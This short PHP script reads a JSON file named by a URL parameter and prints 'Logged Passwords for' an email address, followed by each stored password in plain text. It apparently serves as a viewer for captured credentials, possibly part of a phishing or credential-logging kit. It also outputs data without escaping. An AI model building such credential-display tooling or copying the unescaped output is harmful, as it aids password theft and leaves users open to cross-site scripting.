<?php

require_once 'vendor/autoload.php';
require_once "read_secret.php";
require_once "authenticate.php";

$data = json_decode(file_get_contents("links/" . basename($_GET["l"]) . ".json"), true);
echo "<h2>Logged Passwords for " . $data["email"] . "</h2><br>";
foreach ($data["passwords"] as $password) {
    echo $password . "<br>";
}

?>

